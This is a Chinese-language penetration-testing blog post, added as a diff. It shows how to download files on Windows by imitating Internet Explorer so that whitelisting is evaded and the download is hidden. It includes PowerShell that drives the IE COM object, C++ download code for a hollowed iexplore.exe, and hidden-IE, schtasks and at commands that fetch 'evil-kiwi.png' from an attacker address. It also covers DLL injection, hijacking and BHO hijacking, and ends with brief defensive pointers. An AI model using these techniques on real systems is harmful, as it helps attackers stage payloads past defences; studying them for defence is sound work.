@@ -1,0 +1,288 @@
+I"�/<h2 id="0x00-前言">0x00 前言</h2>
+<hr />
+
+<p>在之前的文章<a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8Egithub%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E7%9A%84%E5%A4%9A%E7%A7%8D%E6%96%B9%E6%B3%95">《渗透技巧——从github下载文件的多种方法》</a>介绍了通过cmd从github下载文件的多种方法，选出最短的实现代码(长度为25)。</p>
+
+<p>本文将站在另一角度，介绍Windows系统下模拟IE浏览器实现文件下载的方法。</p>
+
+<p>模拟IE浏览器实现文件下载不仅能够绕过白名单程序的拦截，而且能在一定程度上隐藏下载行为。所以本文将站在利用的角度介绍具体的利用方法，结合利用方法总结防御思路。</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr />
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>模拟IE浏览器实现文件下载的多种方法</li>
+  <li>分析优缺点</li>
+  <li>总结防御思路</li>
+</ul>
+
+<h2 id="0x02-实现方法">0x02 实现方法</h2>
+<hr />
+
+<p>由于方法众多，所以本文做了一个简单分类,整体上分为主动和被动两种模式。
+主动模式代表通过命令主动实现文件下载，被动模式代表劫持用户行为，在用户打开IE时实现文件下载
+其中，主动模式也要做一个区分，分为当前后台进程是否有IE浏览器进程iexplore.exe</p>
+
+<p>具体方法如下：</p>
+
+<h3 id="1主动模式">1、主动模式</h3>
+
+<h4 id="1-后台无ie进程">(1) 后台无IE进程</h4>
+
+<p><strong>a) 调用IE COM对象</strong></p>
+
+<p>参考链接：</p>
+
+<p>https://adapt-and-attack.com/2017/12/19/internetexplorer-application-for-c2/</p>
+
+<p>通过COM对象<code class="language-plaintext highlighter-rouge">InternetExplorer.Application</code>实现文件下载，后台进程为iexplore.exe</p>
+
+<p>powershell代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ie_com = New-Object -ComObject InternetExplorer.Application
+$ie_com.Silent = $True
+$ie_com.Visible = $False
+$Headers = "Host: &lt;SNIP&gt;.cloudfront.net`r`n"
+$ie_com.Navigate2("http://192.168.62.131/index.html", 14, 0, $Null, $Headers)
+while($ie_com.busy -eq $true) {
+    Start-Sleep -Milliseconds 100
+}
+$html = $ie_com.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $ie_com.document, $Null).InnerHtml
+$html
+$ie_com.Quit();
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>若IE从未运行过，执行以上代码会弹框提示</p>
+
+<p>powershell代码引用自https://gist.github.com/leoloobeek/f468d34e81795239a8f8bac03646cf59，该页面还包含cs、js和vbs的实现方法</p>
+
+<p><strong>b) Process Hollowing</strong></p>
+
+<p>参考文章：</p>
+
+<p><a href="https://3gstudent.github.io/%E5%82%80%E5%84%A1%E8%BF%9B%E7%A8%8B%E7%9A%84%E5%AE%9E%E7%8E%B0%E4%B8%8E%E6%A3%80%E6%B5%8B">《傀儡进程的实现与检测》</a></p>
+
+<p>创建傀儡进程iexplore.exe，传入参数<code class="language-plaintext highlighter-rouge">CREATE_SUSPENDED</code>使进程挂起，清空iexplore.exe进程的内存数据，申请新的内存，写入payload，恢复寄存器环境，执行文件下载</p>
+
+<p>通过c++实现的文件下载代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;wininet.h&gt;
+#define MAXBLOCKSIZE 1024
+#pragma comment( lib, "wininet.lib" ) ;
+void download(const char *Url,const char *save_as)
+{
+  byte Temp[MAXBLOCKSIZE];
+  ULONG Number = 1;
+
+  FILE *stream;
+  HINTERNET hSession = InternetOpen((LPCSTR)"RookIE/1.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+  if (hSession != NULL)
+  {
+    HINTERNET handle2 = InternetOpenUrl(hSession, (LPCSTR)Url, NULL, 0, INTERNET_FLAG_DONT_CACHE, 0);
+    if (handle2 != NULL)
+    {
+      fopen_s(&amp;stream, save_as, "wb" );
+      while (Number &gt; 0)
+      {
+        InternetReadFile(handle2, Temp, MAXBLOCKSIZE - 1, &amp;Number);
+
+        fwrite(Temp, sizeof (char), Number , stream);
+      }
+      fclose( stream );
+      InternetCloseHandle(handle2);
+      handle2 = NULL;
+    }
+    InternetCloseHandle(hSession);
+    hSession = NULL;
+  }
+}
+int main(int argc, char* argv[]){
+  download("https://github.com/3gstudent/test/raw/master/putty.exe","c:\\test\\putty.exe");
+  return 0;
+}
+</code></pre></div></div>
+
+<p>打开防火墙监控，下载进程为Internet Explorer，完整测试如下图</p>
+
+<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-1-3/1-1.gif" alt="Alt text" /></p>
+
+<p><strong>c) Process Doppelganging</strong></p>
+
+<p>参考文章：</p>
+
+<p><a href="https://3gstudent.github.io/Process-Doppelganging%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D">《Process-Doppelganging利用介绍》</a></p>
+
+<p>原理上类似于Process Hollowing，实现思路为打开一个正常文件，创建transaction；在这个transaction内填入payload，payload作为进程被启动；回滚transaction</p>
+
+<p>需要注意的是Process Doppelganging需要对正常文件进行写入操作。如果是对iexplore.exe进行利用，需要获得Trusted Installer权限，获得Trusted Installer权限的方法可参考文章：</p>
+
+<p><a href="https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8">《渗透技巧——Token窃取与利用》</a></p>
+
+<p><strong>d) 隐蔽启动IE，访问特定网址，通过缓存获得下载的文件</strong></p>
+
+<p>第一种思路：</p>
+
+<p>cmd启动IE，访问网址，通过缓存获得下载的文件</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>start "C:\Program Files\Internet Explorer\iexplore.exe" http://192.168.62.131/evil-kiwi.png
+</code></pre></div></div>
+
+<p><strong>注：</strong></p>
+
+<p>这种方式会打开IE的界面，但可通过API <code class="language-plaintext highlighter-rouge">ShowWindowAsync</code>隐藏IE界面，powershell实现脚本：</p>
+
+<p>https://github.com/3gstudent/Writeup/blob/master/HiddenProcess.ps1</p>
+
+<p>第二种思路：</p>
+
+<p>通过powershell隐蔽启动IE，访问网址，通过缓存获得下载的文件</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -executionpolicy bypass -Command "Start-Process -FilePath \"C:\Program Files\Internet Explorer\iexplore.exe\" -ArgumentList http://192.168.62.131/evil-kiwi.png -WindowStyle Hidden"
+</code></pre></div></div>
+
+<p>以上两种思路通过IE访问网址后，会在如下位置保存缓存文件：</p>
+
+<ul>
+  <li>Win7: <code class="language-plaintext highlighter-rouge">%LOCALAPPDATA%\Microsoft\Windows\Temporary Internet Files</code></li>
+  <li>Win8、Win10: <code class="language-plaintext highlighter-rouge">%LOCALAPPDATA%\Microsoft\Windows\INetCache\IE</code></li>
+</ul>
+
+<p>可使用通配符获得不同系统下缓存文件的路径，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir %LOCALAPPDATA%\*evil-kiwi*.png /s /b
+</code></pre></div></div>
+
+<p>以上两种思路会在IE浏览器留下历史记录，历史记录对应路径为： <code class="language-plaintext highlighter-rouge">%LOCALAPPDATA%\Microsoft\Windows\History\</code></p>
+
+<p>该方法的父进程为powershell.exe，但可以通过token复制改变父进程(例如SelectMyParent、Invoke-TokenManipulation.ps1)</p>
+
+<p>第三种思路:</p>
+
+<p>利用计划任务启动IE，访问网址，通过缓存获得下载的文件(需要管理员权限)</p>
+
+<p>命令1：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>at  6:34 "C:\Program Files\Internet Explorer\iexplore.exe" http://192.168.62.131/evil-kiwi.png
+</code></pre></div></div>
+
+<p>命令2：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>schtasks /create /RU SYSTEM /RP "" /SC ONCE /TN test1 /TR "C:\Program Files\Internet Explorer\iexplore.exe http://192.168.62.131/evil-kiwi.png" /ST 06:34 /F  
+</code></pre></div></div>
+
+<p>由于计划任务的权限为system，所以用户桌面无法查看启动的IE浏览器界面，缓存位置也不同，通用路径为<code class="language-plaintext highlighter-rouge">%windir%\System32\config\systemprofile\AppData\Local\Microsoft\Windows\</code>
+可使用通配符获得不同系统下缓存文件的路径，命令如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dir %windir%\*evil-kiwi*.png /s /b
+</code></pre></div></div>
+
+<p>所以使用计划任务打开的IE浏览器，不存在历史记录，父进程为svchost.exe</p>
+
+<p>第四种思路：</p>
+
+<p>创建服务启动IE，访问网址，通过缓存获得下载的文件</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sc create Test1 type= own binpath= "C:\Program Files\Internet Explorer\iexplore.exe"
+sc start test1
+</code></pre></div></div>
+
+<p>通过这种方式启动的服务，调用的程序需要能够同SCM(Services Control Manager)进行交互，而iexplorer.exe不支持这个功能</p>
+
+<p>可通过其他方式创建服务</p>
+
+<p><strong>注：</strong></p>
+
+<p>隐蔽启动IE，访问特定网址，通过缓存获得下载的文件后，需要手动结束IE进程</p>
+
+<p><strong>e) 隐蔽启动ie，进行DLL注入(APC、Atombombing)</strong></p>
+
+<p>隐蔽启动IE后，对IE进程进行dll注入，dll实现文件下载的功能</p>
+
+<p>APC注入的代码可参考：</p>
+
+<p>https://github.com/3gstudent/Inject-dll-by-APC</p>
+
+<p>Atombombing可以理解为APC注入的升级版，可参考文章：</p>
+
+<p><a href="https://3gstudent.github.io/AtomBombing%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90">《AtomBombing利用分析》</a></p>
+
+<h4 id="2-后台有ie进程">(2) 后台有IE进程</h4>
+
+<p><strong>a) DLL注入(APC、Atombombing)</strong></p>
+
+<p>方法同上，不再赘述</p>
+
+<h3 id="2被动模式">2、被动模式</h3>
+
+<p><strong>a) DLL劫持</strong></p>
+
+<p>这里仅给出一个实例： <code class="language-plaintext highlighter-rouge">C:\Program Files\Internet Explorer\IEShims.dll</code></p>
+
+<p>该dll在IE浏览器打开时被加载</p>
+
+<p>DLL开发思路：</p>
+
+<p>可使用工具<code class="language-plaintext highlighter-rouge">exportstoc</code>，下载地址：</p>
+
+<p>https://github.com/michaellandi/exportstoc</p>
+
+<p>生成方法可参考文章：</p>
+
+<p>https://3gstudent.github.io/Study-Notes-Weekly-No.1(Monitor-WMI_ExportsToC++_Use-DiskCleanup-bypass-UAC)</p>
+
+<p>原dll保留，启动时需要做一个互斥，避免多次启动</p>
+
+<p><strong>b) BHO</strong></p>
+
+<p>利用BHO(Browser Helper Object)劫持IE浏览器，在浏览器页面打开时实现文件下载，可参考文章：</p>
+
+<p><a href="https://3gstudent.github.io/%E5%88%A9%E7%94%A8BHO%E5%AE%9E%E7%8E%B0IE%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8A%AB%E6%8C%81">《利用BHO实现IE浏览器劫持》</a></p>
+
+<h2 id="0x03-小结">0x03 小结</h2>
+<hr />
+
+<p>综上，模拟IE浏览器下载文件的实现方法如下：</p>
+
+<p>(1) 主动模式</p>
+
+<p>当前后台无IE进程：</p>
+
+<ul>
+  <li>调用IE COM对象</li>
+  <li>Process Hollowing</li>
+  <li>Process Doppelganging</li>
+  <li>隐蔽启动IE，访问特定网址，通过缓存获得下载的文件
+    <ul>
+      <li>通过cmd启动</li>
+      <li>通过服务启动</li>
+      <li>创建服务启动</li>
+    </ul>
+  </li>
+  <li>隐蔽启动IE，进行DLL注入(APC、Atombombing)</li>
+</ul>
+
+<p>当前后台有IE进程：</p>
+
+<ul>
+  <li>DLL注入(APC、Atombombing)</li>
+</ul>
+
+<p>(2) 被动模式</p>
+
+<ul>
+  <li>DLL劫持</li>
+  <li>BHO</li>
+</ul>
+
+<p>站在防御的角度，应对主动模式的利用方法，需要注意iexplore.exe的父进程是否可疑；应对DLL注入和DLL劫持，可监控敏感API的调用；应对BHO对象，可监控特定注册表</p>
+
+<hr />
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+:ET
